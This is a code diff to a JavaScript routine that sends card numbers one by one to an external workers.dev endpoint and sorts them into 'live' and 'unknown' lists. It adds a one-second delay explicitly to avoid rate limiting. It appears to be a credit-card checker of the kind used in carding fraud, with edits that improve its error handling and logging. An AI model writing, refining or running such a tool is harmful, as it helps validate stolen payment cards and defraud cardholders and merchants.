@@ -50,7 +50,13 @@ async function startChecking() {
 
     try {
       const response = await fetch(`https://bbinl.islamraisul796.workers.dev/?cc=${encodeURIComponent(card)}`);
+      
+      // Check CORS validity first
+      if (!response.ok) throw new Error(`Server returned ${response.status}`);
+
       const data = await response.json();
+      console.log("Response for", card, "=>", data);
+
       const result = data?.response?.trim().toLowerCase();
 
       if (result === "live") {
@@ -66,18 +72,19 @@ async function startChecking() {
         unknownDiv.innerHTML += `${card}<br>`;
         unknownCountSpan.textContent = unknownCount;
       }
+
     } catch (err) {
-      console.error("Error checking card:", card, err);
+      console.error(`Error with card ${card}:`, err);
       unknownCount++;
       unknownDiv.innerHTML += `${card}<br>`;
       unknownCountSpan.textContent = unknownCount;
     }
 
-    // Optional delay to avoid rate-limiting
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    // Add delay between requests (to avoid rate-limit)
+    await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec delay
   }
 
-  // Enable buttons again
+  // Enable Start button again
   document.getElementById("check-btn").disabled = false;
   document.getElementById("stop-check-btn").disabled = true;
 }
